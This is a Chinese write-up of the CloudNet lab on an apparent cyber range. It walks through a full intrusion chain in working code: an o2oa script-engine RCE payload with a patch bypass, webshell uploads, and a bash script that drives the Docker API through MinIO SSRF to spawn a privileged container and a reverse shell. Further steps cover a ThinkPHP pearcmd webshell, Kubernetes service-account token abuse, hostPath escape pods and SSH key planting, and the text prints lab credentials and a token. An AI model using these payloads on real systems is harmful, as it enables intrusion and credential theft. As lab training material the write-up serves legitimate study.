#  [靶场复现计划]春秋云境 CloudNet   
 格格巫和蓝精灵   2024-12-22 00:33  
  
## 外网o2oa漏洞拿下容器权限  
  
8080端口存在o2oa，默认账号密码：xadmin/o2oa@2022  
  
去Github上搜，有漏洞issue：  
- https://github.com/o2oa/o2oa/issues/159  
  
但是直接用下面这个payload打不通：  
```
var a = mainOutput(); function mainOutput() {    var clazz = Java.type("java.lang.Class");    var rt = clazz.forName("java.lang.Runtime");    var stringClazz = Java.type("java.lang.String");    var getRuntimeMethod = rt.getMethod("getRuntime");    var execMethod = rt.getMethod("exec",stringClazz);    var runtimeObject = getRuntimeMethod.invoke(rt);    execMethod.invoke(runtimeObject,"open -a Calculator");};
```  
  
issue是6月19日提交的，版本需要<9.0.3  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqP4yPn17OOOPc3p0XDJQvUibgGo6vm2ylSdQxblkqiaIjkJiamtsxvyicX8g/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
右键查看题目源码，是9.1.2的版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPgqVY3lDRLKEiciapp7Jibqs5MSfzQeIZOZ0oiaazhMHRJ2ib8Yy7hyXcntQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
修复方案是在scriptingBlockedClasses里添加对java.lang.Class的限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPlClDaWiaVIv8hA9mMicPxN0iciaZiaoOVPIXa9UVjibDdmsBXj3oxfFweCxw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
直接用上方issue里的EXP打爆下方错误：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPCicO4fQaANNY0znyqx4iaD02hFAd1icD1a5HJL0qDSQibNAicNdmL4ARvKQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
但漏洞本质是利用ScriptEngineManager类进行命令执行，只对java.lang.Class做限制肯定可以绕过的，这里直接用java.lang.ClassLoader去加载java.lang.Runtime实现绕过  
```
var a = mainOutput(); function mainOutput() {    var classLoader = Java.type("java.lang.ClassLoader");    var systemClassLoader = classLoader.getSystemClassLoader();    var runtimeMethod = systemClassLoader.loadClass("java.lang.Runtime");    var getRuntime = runtimeMethod.getDeclaredMethod("getRuntime");    var runtime = getRuntime.invoke(null);    var exec = runtimeMethod.getDeclaredMethod("exec", Java.type("java.lang.String"));    exec.invoke(runtime, "calc");}
```  
  
点击后台服务管理功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPsCeAibMFWEjWtvmA5XXDPBrX7I3xkDKWEf2N2JjPTmvia7iazrRibVeI0A/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
新建一个代理配置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPRNVxrqOb5hjkHO438xCgEaBs0b8cgFD3HOqdyViacET2Z8TgUFhRvMw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
内容如下，按Ctrl + S保存  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPiauafibuqPwRVEdj0CoFxZia2wOkvxB4TKHQQn8Xgltddmxsfxyp00zDw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
点击运行即可（如何提示uuid不存在，返回一下页面再点击立即运行）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPu02yB0l4h1NY8cKjs6YmqCiatxCqbJwdHOPlicRvv67Ya5hiaFc1ibDeDw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
拿到外网的FLAG，8080端口机器很明显是Docker容器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPnWgS2oLdT59KMByqdCIviaicmibqmp5VSGq30HibUwLvLbHuGavT6LpOVA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## Minio文件同步拿下入口宿主机  
  
点开o2oa的系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPlEuZaKXONEGiardA4zUBGiaeSsOLPv877uclPDuRZePozrywiaye60oKw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
下面有个JSON配置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqP2QdIuPpiakZQ20zC1RArU1VvyQTrLiagZFg5fEAUPlAwHCbGibIprQJVQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
里面存放了Minio的aksk：  
```
{  "protocol": "min",  "username": "bxBZOXDlizzuujdR",  "password": "TGdtqwJbBrEMhCCMDVtlHKU=",  "host": "172.22.18.29",  "port": 9000,  "name": "o2oa"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPb9XudlmKGZSWFicfC6pzNR3F7PptFDIibF1HLzsYRiaYMQJr70aefRrRQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
虽然目前拿到的Docker容器是172.17.0.2/24网段，但是依然可以访问172.22.18.29:9000  
  
配置代理访问Minio，登录后发现portal这个Bucket就是80端口服务的源码，猜测可能存在文件同步  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPDxqmyT90GbHtlGkRv6C8VqX2t5qicIBIHyVInibSbUGlHgRzOF3EbTlA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
直接上传webshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPSatpgdiazibzPiazPia8Pvh00zOoqJju0vUQsJLNd8uf898Eiaagsencouw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
等待同步后，用蚁剑连接即可：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPY99rJeqApecFxjSMhnX4e2ypUcv2OV8mddlhEiawr8h5ibg54ricfcLbg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 二层内网信息搜集  
- 172.22.18.64 Harbor  
  
- 172.22.18.61 医院内部平台、极致CMS  
  
- 172.22.18.29 minio  
  
- 172.22.18.23 外网  
  
## Minio SSRF打2375创建恶意容器  
  
大致思路参考下方文章：  
- https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api  
  
Harbor机器存在未授权，泄露了public/mysql:5.6镜像  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPWSQ9wUzvtMDuQ5nLFIn3YicrCXJMbnDIzYZHlVQqWxgicN56xlW6SRjg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
用Docker拉取镜像，注意docker pull的代理需要通过systemd进行配置：  
```
vim /etc/systemd/system/docker.service.d/http-proxy.conf# 文件内容如下[Service]Environment="HTTP_PROXY=socks5://1.1.1.1:40002/"# 配置后重启服务systemctl daemon-reloadsystemctl restart docker
```  
  
接着拉取镜像（下图是已经拉取过的）：  
```
docker pull 172.22.18.64/public/mysql:5.6
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPCLHbAkAByvicEpiaHCfbT4ibePzoUOsTh3ty5REBAz0XclAKib17Miaqapw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
没有curl、wget  
```
docker run -itd 172.22.18.64/public/mysql:5.6 docker exec -it 26bc97 bash
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPrQCXm37HpGDRMo93PmSTWySdnC6yz8fhWWuYcxWgeLHIIS7iclqTr0w/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
因为没有curl、wget，所以只能用exec来发包，下方代码一共四步：  
1. 创建一个172.22.18.64/public/mysql:5.6镜像的容器，Privileged为true，挂载宿主机的/到容器内的/mnt目录，将响应包中的id保存到/tmp/id（此id为容器id，所以截取一部分即可），此时容器为Create状态  
  
1. 将容器启动，启动容器需要容器id，从/tmp/id中读取即可，此时容器为Running状态  
  
1. 为容器创建一条命令，命令的具体内容为反弹shell到外网入口机的19999端口，将响应包中的id保存到/tmp/id（此id为命令id，必须要截取完整，通过cut命令进行截取），此时命令还未被执行  
  
1. 根据前面截取的命令id执行命令，tty为false表示不交互  
  
```
#!/usr/bin/env bash# 1exec 3<>/dev/tcp/172.17.0.1/2375lines=(    'POST /containers/create HTTP/1.1'    'Host: 172.17.0.1:2375'    'Connection: close'    'Content-Type: application/json'    'Content-Length: 133'    ''    '{"HostName":"remoteCreate","User":"root","Image":"172.22.18.64/public/mysql:5.6","HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}')printf '%s\r\n' "${lines[@]}" >&3while read -r data <&3; do    echo $data    if [[ $data == '{"Id":"'* ]]; then        echo $data | cut -c 8-12 > /tmp/id    fidoneexec 3>&-# 2exec 3<>/dev/tcp/172.17.0.1/2375lines=(    "POST /containers/`cat /tmp/id`/start HTTP/1.1"    'Host: 172.17.0.1:2375'    'Connection: close'    'Content-Type: application/x-www-form-urlencoded'    'Content-Length: 0'    '')printf '%s\r\n' "${lines[@]}" >&3while read -r data <&3; do    echo $datadoneexec 3>&-# 3exec 3<>/dev/tcp/172.17.0.1/2375lines=(    "POST /containers/`cat /tmp/id`/exec HTTP/1.1"    'Host: 172.17.0.1:2375'    'Connection: close'    'Content-Type: application/json'    'Content-Length: 75'    ''    '{"Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/172.22.18.23/19999 0>&1"]}')printf '%s\r\n' "${lines[@]}" >&3while read -r data <&3; do    echo $data    if [[ $data == '{"Id":"'* ]]; then        echo $data | cut -c 8-71 > /tmp/id    fidoneexec 3>&-# 4exec 3<>/dev/tcp/172.17.0.1/2375lines=(    "POST /exec/`cat /tmp/id`/start HTTP/1.1"    'Host: 172.17.0.1:2375'    'Connection: close'    'Content-Type: application/json'    'Content-Length: 27'    ''    '{"Detach":true,"Tty":false}')printf '%s\r\n' "${lines[@]}" >&3while read -r data <&3; do    echo $datadoneexec 3>&-
```  
  
将上方内容做Base64编码，写到Dockerfile里，将Dockerfile保存至入口机的/var/www/html/Dockerfile路径  
```
FROM 172.22.18.64/public/mysql:5.6RUN echo IyEvdXNyL2Jpbi9lbnYgYmFzaAoKIyAxCmV4ZWMgMzw+L2Rldi90Y3AvMTcyLjE3LjAuMS8yMzc1CmxpbmVzPSgKICAgICdQT1NUIC9jb250YWluZXJzL2NyZWF0ZSBIVFRQLzEuMScKICAgICdIb3N0OiAxNzIuMTcuMC4xOjIzNzUnCiAgICAnQ29ubmVjdGlvbjogY2xvc2UnCiAgICAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJwogICAgJ0NvbnRlbnQtTGVuZ3RoOiAxMzMnCiAgICAnJwogICAgJ3siSG9zdE5hbWUiOiJyZW1vdGVDcmVhdGUiLCJVc2VyIjoicm9vdCIsIkltYWdlIjoiMTcyLjIyLjE4LjY0L3B1YmxpYy9teXNxbDo1LjYiLCJIb3N0Q29uZmlnIjp7IkJpbmRzIjpbIi86L21udCJdLCJQcml2aWxlZ2VkIjp0cnVlfX0nCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCiAgICBpZiBbWyAkZGF0YSA9PSAneyJJZCI6IicqIF1dOyB0aGVuCiAgICAgICAgZWNobyAkZGF0YSB8IGN1dCAtYyA4LTEyID4gL3RtcC9pZAogICAgZmkKZG9uZQpleGVjIDM+Ji0KCiMgMgpleGVjIDM8Pi9kZXYvdGNwLzE3Mi4xNy4wLjEvMjM3NQpsaW5lcz0oCiAgICAiUE9TVCAvY29udGFpbmVycy9gY2F0IC90bXAvaWRgL3N0YXJ0IEhUVFAvMS4xIgogICAgJ0hvc3Q6IDE3Mi4xNy4wLjE6MjM3NScKICAgICdDb25uZWN0aW9uOiBjbG9zZScKICAgICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcKICAgICdDb250ZW50LUxlbmd0aDogMCcKICAgICcnCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCmRvbmUKZXhlYyAzPiYtCgojIDMKZXhlYyAzPD4vZGV2L3RjcC8xNzIuMTcuMC4xLzIzNzUKbGluZXM9KAogICAgIlBPU1QgL2NvbnRhaW5lcnMvYGNhdCAvdG1wL2lkYC9leGVjIEhUVFAvMS4xIgogICAgJ0hvc3Q6IDE3Mi4xNy4wLjE6MjM3NScKICAgICdDb25uZWN0aW9uOiBjbG9zZScKICAgICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nCiAgICAnQ29udGVudC1MZW5ndGg6IDc1JwogICAgJycKICAgICd7IkNtZCI6IFsiL2Jpbi9iYXNoIiwgIi1jIiwgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjIyLjE4LjIzLzE5OTk5IDA+JjEiXX0nCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCiAgICBpZiBbWyAkZGF0YSA9PSAneyJJZCI6IicqIF1dOyB0aGVuCiAgICAgICAgZWNobyAkZGF0YSB8IGN1dCAtYyA4LTcxID4gL3RtcC9pZAogICAgZmkKZG9uZQpleGVjIDM+Ji0KCiMgNApleGVjIDM8Pi9kZXYvdGNwLzE3Mi4xNy4wLjEvMjM3NQpsaW5lcz0oCiAgICAiUE9TVCAvZXhlYy9gY2F0IC90bXAvaWRgL3N0YXJ0IEhUVFAvMS4xIgogICAgJ0hvc3Q6IDE3Mi4xNy4wLjE6MjM3NScKICAgICdDb25uZWN0aW9uOiBjbG9zZScKICAgICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nCiAgICAnQ29udGVudC1MZW5ndGg6IDI3JwogICAgJycKICAgICd7IkRldGFjaCI6dHJ1ZSwiVHR5IjpmYWxzZX0nCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCmRvbmUKZXhlYyAzPiYtCgoK | base64 -d > /tmp/1.shRUN chmod +x /tmp/1.sh && /tmp/1.sh
```  
  
将下方index.php保存至入口机的/var/www/html/index.php中  
```
<?phpheader('Location: http://127.0.0.1:2375/build?remote=http://172.22.18.23/Dockerfile&nocache=true&t=evil:2', false, 307);
```  
  
删除入口机的/var/www/html/index.html（非常重要！），因为Minio的SSRF漏洞默认请求/路径，如果不删除index.html，在index.php和index.html共存时会优先访问index.html  
```
rm -rf /var/www/html/index.html
```  
  
接着打Minio的SSRF漏洞，注意Host为SSRF地址（外网入口机172.22.18.23），HTTP包实际发送给Minio（172.22.18.29）  
```
POST /minio/webrpc HTTP/1.1 Host: 172.22.18.23 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 76 {"id":1,"jsonrpc":"2.0","params":{"token": "Test"},"method":"web.LoginSTS"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPkVM3ESCKvnCntQjTBzdx7yiaXicm9AdgV2pcw9jeXTQOCsgMg7cicBzQw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
即可收到反弹shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPcLkhMFQXldMpw6sh51V9pb0SlGXl4CLbxjx8sRZd6yEqkWYaLXsAPA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
顺手写个公钥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqP8PGZiaXcb9D8AJxRL0PibkBulOg3ujOdyKLKxY3nbsceicgjrwYnIxlgA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPia43J6jcXJrXDlLqRfmVMTANDEac0z7G2kQkldCGw8C69o4cyHOsuxQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 内网极致CMS多语言命令执行  
  
172.22.18.61打开是一个医院公告平台，不过随便输一个404的路由就能发现是极致CMS  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPPtLxO84CsUDlBWg4OuUzZZrz2TvZmA68j07MRsrNmyiczAdpPTv2Z9A/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
随便fuzz了一下，发现可以用ThinkPHP6.0多语言RCE的漏洞，区别是参数为l  
```
GET /index.php?+config-create+/&l=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=eval($_POST[1]);?>+/var/www/html/shell.php HTTP/1.1 Host: 172.22.18.61 Cookie: PHPSESSID=58bbffbaacb734c29005f4565c04cf3b Connection: close
```  
  
然后用蚁剑连接即可：  
```
http://172.22.18.61/shell.php
```  
  
配置文件如下：  
```
<?php returnarray ('db' => array (    'host' => 'mysql',    'dbname' => 'jizhicms',    'username' => 'root',    'password' => 'Mysqlroot@!123',    'prefix' => 'jz_',    'port' => '3306',  ),'redis' => array (    'SAVE_HANDLE' => 'Redis',    'HOST' => '127.0.0.1',    'PORT' => 6379,    'AUTH' => NULL,    'TIMEOUT' => 0,    'RESERVED' => NULL,    'RETRY_INTERVAL' => 100,    'RECONNECT' => false,    'EXPIRE' => 1800,  ),'APP_DEBUG' => true,); ?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPxsnqZt39HnM8uL4NOmam5BXLpUULiajF2sN79TreIhyHZfYZLHDDYxg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
连接MySQL  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPfP2L6jR9bObRrbhYBFKISb2Vldp2kcpm33Pbnlezmp6mAZoE6GiapSg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
发现secure_file_priv为false  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPRQh4m9PZdsWIDvIibynxrkIux0rAVVynv06qlrwkmPDnYsGTm2XTb1A/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
且mysql位于172.20.166.134  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPF34vJok6EpxY4f5BIjf9g3tc870eEBICJJgEvRh9rKAL3JTpBicbkew/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 服务账户token泄露污点横向接管k8s  
  
前面获取的极致CMS权限也位于172.22.166.0段，这个hostname的命名方式很明显就是k8s的pod  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPU9oBtia0P1wLny206ianUrCxf46ZtfKepuYvlCrAN4ibu8Rs5QaS1ovOQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
通过cdk工具判断API Server位于10.68.0.1：  
```
./cdk_linux_amd64 evaluate
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPvChWE3ibwwibcMflygyiakXQHyP9icOVd7Q7gPf9yrxyd3edKOJjbVXabg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
在极致CMS和MySQL都能找到serviceaccount的token，位于/var/run/secrets/kubernetes.io/serviceaccount/token，经过测试MySQL中serviceaccount的token权限较高  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqP8BazyU8LBL5ibBj76cAJXSkwN0YMibRMcsSekr1IsoWjCqa1BPvOS4mg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
本地创建kubeconfig，注意这里的server需要为10.68.0.1，该IP需要从极致CMS才能访问到，建议在极致CMS上用Neo-reGeorg走正向代理：  
```
apiVersion: v1kind:Configclusters:-name:my-clustercluster:    server:https://10.68.0.1/    # certificate-authority: /path/to/ca.crt # 替换为你的 CA 证书路径。如果无需 CA 验证，可删除此行并添加 insecure-skip-tls-verify: true    insecure-skip-tls-verify:true# 如果你想跳过证书验证，请取消此行注释users:-name:my-useruser:    token:eyJhbGciOiJSUzI1NiIsImtpZCI6IlRSaDd3eFBhYXFNTkg5OUh0TnNwcW00c0Zpand4LUliXzNHRU1raXFjTzQifQ.eyJhdWQiOlsiYXBpIiwiaXN0aW8tY2EiXSwiZXhwIjoxNzY2MzIxMDQxLCJpYXQiOjE3MzQ3ODUwNDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2YyIsImp0aSI6IjljZjc5ZWI4LTM3NzgtNDkyMC05YWU0LTE4NDMyNjQ3MWVhMCIsImt1YmVybmV0ZXMuaW8iOnsibmFtZXNwYWNlIjoiZGVmYXVsdCIsIm5vZGUiOnsibmFtZSI6Im5vZGUyIiwidWlkIjoiYjAzYjUwZTgtOTBkOS00YjdkLWFmM2EtMGZiMjY3MWUyNjFmIn0sInBvZCI6eyJuYW1lIjoibXlzcWwtNmRmODc2ZDZkYy1mNnFmZyIsInVpZCI6ImNmMzMyYjUxLWM2NDYtNDExNi04ZGRhLTFmMDJiZTAyM2FmZSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoibXlzcWwiLCJ1aWQiOiJhNTMyNDZlNy0yZDFkLTQxMzMtOGM4OS05ZGNhMWI5YmIxNGYifSwid2FybmFmdGVyIjoxNzM0Nzg4NjQ4fSwibmJmIjoxNzM0Nzg1MDQxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpteXNxbCJ9.QV_B2fmW4qT6kjK0_rPVNL72fK3nsOZOFXpnR3e6c3enZU03sA9lBowe4Nb0kGIE1I4WdBd6ItB6KAmAW2Xze17EXPVTvLzQZui-pJULVV_HfWCuJMp-H1KEVk3ZrS0UZ6sAH6HALGb_FrlzVVHVxbRybWk4t_h9yT8MxYz4XZkPe8AXxhqe41pcB5boI7scUSJQt0DYkLUtBVyg6o8FKRuzL5PHBqmGO_b6ab5L-abzjjGvoKBC9Tmc72_CPlHrKNEU9upu00lwRwYtUhVvi1jFamqmZSVTTrg9SI0-96lSLGVuu5AnO5j3UKYOUJLB1kKpVtxG1OJXeExgh8g4JQcontexts:-name:my-contextcontext:    cluster:my-cluster    user:my-usercurrent-context:my-context
```  
  
利用kubectl连接查看node，需要注意题目将master节点被标记为SchedulingDisabled（不可调度）  
```
kubectl --kubeconfig k8s.yaml get nodes
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPIMkWxfBCLKJAlDVYNvbyyYBTOwicLs9QhHBp6at7q83tRCKibxOP5dJA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
并且还有node.kubernetes.io/unschedulable:NoSchedule污点  
```
kubectl --kubeconfig k8s.yaml describe node master
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPGlGQibHXqGYX4Nrddlh8PyBCP4oDichEJg40jg1jDVgkV11iac2jfFdFg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
我们用uncordon将master节点标记为可调度状态  
```
kubectl --kubeconfig k8s.yaml uncordon master
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPZpSQqpGNiam8kqEv9amtIiadjvHPoxuYkdfp9q7KSVs7Rmc1Jd6YNHZA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
编写YAML启动容器进行逃逸，注意需要容忍node.kubernetes.io/unschedulable:NoSchedule污点：  
```
apiVersion: v1kind:Podmetadata:name:evilpod1spec:nodeName:node1# node2 mastertolerations:    -key:node.kubernetes.io/unschedulable      operator:Exists      effect:NoSchedulecontainers:    -name:mycontainer      image:172.22.18.64/public/mysql:5.6      command:["/bin/sleep","3650d"]      volumeMounts:        -name:aaa          mountPath:/aaavolumes:    -name:aaa      hostPath:        path:/        type:Directory
```  
```
kubectl --kubeconfig k8s.yaml apply -f mysql.yaml kubectl --kubeconfig k8s.yaml exec -it evilpod1 -- /bin/sh
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqP3PY34L00UVsTxgmibKsUpHicMVpCGyATnvjOfMFw4VYYsMbbkiamIlEmg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
同理拿node2：  
```
apiVersion: v1kind:Podmetadata:name:evilpod2spec:nodeName:node2tolerations:    -key:node.kubernetes.io/unschedulable      operator:Exists      effect:NoSchedulecontainers:    -name:mycontainer      image:172.22.18.64/public/mysql:5.6      command:["/bin/sleep","3650d"]      volumeMounts:        -name:aaa          mountPath:/aaavolumes:    -name:aaa      hostPath:        path:/        type:Directory
```  
```
kubectl --kubeconfig k8s.yaml apply -f mysql.yaml kubectl --kubeconfig k8s.yaml exec -it evilpod2 -- /bin/sh
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPib5LeepKrG3ZQL5KNXzbVmxAvMc3zj5MDdECAuRKcuZe9kedFpiccbKQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
再同理拿master节点：  
```
apiVersion: v1kind:Podmetadata:name:evilpod3spec:nodeName:mastertolerations:    -key:node.kubernetes.io/unschedulable      operator:Exists      effect:NoSchedulecontainers:    -name:mycontainer      image:172.22.18.64/public/mysql:5.6      command:["/bin/sleep","3650d"]      volumeMounts:        -name:aaa          mountPath:/aaavolumes:    -name:aaa      hostPath:        path:/        type:Directory
```  
```
kubectl --kubeconfig k8s.yaml apply -f mysql.yaml kubectl --kubeconfig k8s.yaml exec -it evilpod3 -- /bin/sh
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPlLSvMuicXlVhXD8y4VRyQ9MiaMMn1kTWVOma1ibW2DqdiaycqQ1FdXI15g/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 三层内网信息搜集  
  
在master节点上写个公钥直接逃逸，发现新网段172.22.15.0、172.22.50.0  
```
echo -e "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKMLlYIz2KsXTHADrsweCgR9p35OYnFIyqzdDKCAsyW+DqXcA/IsYdGYSZShukeAjTn7axqu/jW92CYqBfp3PB+kI+xXVdOS2RyCGS1Rlgvm7o9BKgOn1f/OQAtyj3XvSoBE31+9SvTfow/GMxYOAvaPYZ1LpBG2w2Xjmm5xyfaQkO/7tHV2ZgqXt9ELikVwuj6LHHwxAA1lOKFTl7jYYTN3rKl8ulw8o4hWZZc4pJjoKwmS8Rh5J2Iu+7sxmHcV+S8/87PePRPJnvW2f28gufdzadAQQ2ovgmlL+ObOGb0owwC0pOu9y1O8aKKw/1shu6QIQPYtD8Wu1xayJBRVjkpGFKxcRjmvWcp9M+rcJZmLkGzyTSY/1PSZMQR4TALfH7SZiEjahubJVAPtJ65F2GiMR5OJLcnm1BZUdmEIkcB2hyBr+3RukJvBGNl+v5gh1gjuNo21VvPXfHVX4TV7lU5dLp0S+Fwu8Jwmm83k05hMBorC943qc+IKdpbFIeCec= root@ubuntu\n\n" > /aaa/root/.ssh/authorized_keys cat /aaa/etc/hosts # 获取master节点IP kubectl --kubeconfig k8s.yaml get node -o wide # 获取master节点IP ssh root@172.22.15.75
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPeEcck2ibNSUTygRK3vFAvwAkIHkBkDM5av3bpunY8W6VZRNwhtibaAbg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPMPklMiarcoxo7enfpRllwoPBJb5eXutyPX4JafZxAB6RYCLLIGdc19A/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
继续信息搜集发现有个harbor-registry-secret的secret：  
```
kubectl --kubeconfig k8s.yaml get secrets kubectl --kubeconfig k8s.yaml get secrets harbor-registry-secret -o jsonpath='{.data}'
```  
  
